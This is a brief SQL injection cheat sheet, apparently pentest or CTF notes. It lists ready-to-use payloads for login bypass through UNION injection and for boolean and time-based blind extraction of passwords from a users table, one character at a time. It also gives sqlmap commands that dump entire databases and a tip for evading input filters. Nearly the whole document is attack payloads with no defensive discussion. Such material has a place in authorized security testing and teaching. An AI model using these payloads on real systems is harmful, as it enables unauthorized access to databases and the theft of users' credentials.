# SQL

## Union injection login form
```
Username: ' UNION SELECT 'pass' AS password#
Password: pass
```

## Blind injection character by character
```
' or (SELECT MID(password,1,1) FROM users LIMIT 0,1)='a' #
' or (SELECT MID(password,1,1) FROM users LIMIT 0,1)='b' #
' or (SELECT MID(password,1,1) FROM users LIMIT 0,1)='c' #
...
' or (SELECT MID(password,1,1) FROM users LIMIT 0,1)='z' #

' or (SELECT MID(password,2,1) FROM users LIMIT 0,1)='a' #
' or (SELECT MID(password,2,1) FROM users LIMIT 0,1)='b' #
' or (SELECT MID(password,2,1) FROM users LIMIT 0,1)='c' #
...
```

## Binary blind injection
```
' or (SELECT ORD(MID(password,1,1)) FROM users LIMIT 0,1)<=ORD('m') #'
```

## Totally blind injection
```
' OR (SELECT IF((SELECT ORD(MID(password,1,1)) FROM users LIMIT
0,1)<=ORD('n'), SLEEP(1), NULL)) #'
```

## Sqlmap specific dump
```
sqlmap --threads <n> -u <url> -D <database> -T <table> -C <column>
```

## Sqlmap complete dump
```
sqlmap --threads <n> -u <url> --dump
```

## Tips
* If spaces are not allowed try tabs or SQL comments
